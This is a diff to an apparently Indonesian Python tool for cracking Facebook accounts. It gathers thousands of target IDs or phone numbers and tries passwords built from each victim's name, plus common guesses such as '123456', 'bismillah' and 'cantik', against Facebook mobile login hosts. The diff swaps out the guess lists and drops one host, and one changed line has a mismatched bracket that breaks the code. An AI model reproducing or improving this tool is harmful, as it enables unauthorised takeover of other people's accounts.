@@ -49,7 +49,7 @@ dump, ok, cp, loop, list_ua, hasil_akun = [], 0, 0, 0, [], []
 def buat_data(akun):
 	user, nama = akun.split("|")[0], akun.split("|")[1].lower()
 	pwx, tampung = [], []
-	belakang = ["123","1234","12345","123456","123_","123__","1234_","1234__"]
+	belakang = ["123","1234","12345","123456","cantik"]
 	namd = nama.split()[0]; namful = nama.replace(" ","")
 	namb = nama.split()[-1]
 	if len(namful) > 5: pwx.append(namful); pwx.append(nama)
@@ -168,7 +168,7 @@ class Cari_Nama:
 ### --- [ TANYA METODE ] --- ###
 def pilih_metode(password):
 	global ok, cp
-	rozh = [z for z in random.sample(dump, len(dump))]; dump.clear(); dump.extend(rozh); daftar_url = ['free.facebook.com', 'm.prod.facebook.com', 'free.prod.facebook.com', 'id-id.facebook.com']; nomor = 1; bas = []
+	rozh = [z for z in random.sample(dump, len(dump))]; dump.clear(); dump.extend(rozh); daftar_url = ['free.facebook.com', 'm.prod.facebook.com', 'free.prod.facebook.com']; nomor = 1; bas = []
 	for url in daftar_url: print(f"[{H}{nomor}{P}] {url}"); nomor += 1
 	no_url = input(f"[{H}?{P}] pilih : "); print()
 	try: main_url = daftar_url[int(no_url)-1]
@@ -217,7 +217,7 @@ def dump_nomor():
 		print(f"\r[{H}!{P}] {nomor} | {len(dump)} ", flush=True, end="")
 		if nomor not in dump: dump.append(nomor)
 		if len(dump)>=5001: break
-	print('\n\r                        '); pilih_metode(["123456","12345678","katasandi","bismillah","rahasia","123_","123__","1234_","1234__"])
+	print('\n\r                        '); pilih_metode(["123456","12345678","katasandi","bismillah","rahasia","cantik")
 
 ### --- [ DUMP EMAIL ] --- ###
 def dump_email():
@@ -241,7 +241,7 @@ def dump_random():
 		print(f"\r[{H}!{P}] {nomor} | {len(dump)} ", flush=True, end="")
 		if nomor not in dump: dump.append(nomor)
 		if len(dump)>=5001: break
-	print('\n\r                        '); pilih_metode(["123456","12345678","password","123456789","bismillah","123_","123__","1234_","1234__"])
+	print('\n\r                        '); pilih_metode(["123456","12345678","password","123456789","bismillah", "cantik"])
 
 ### --- [ DUMP FILE ] --- ###
 def dump_file():
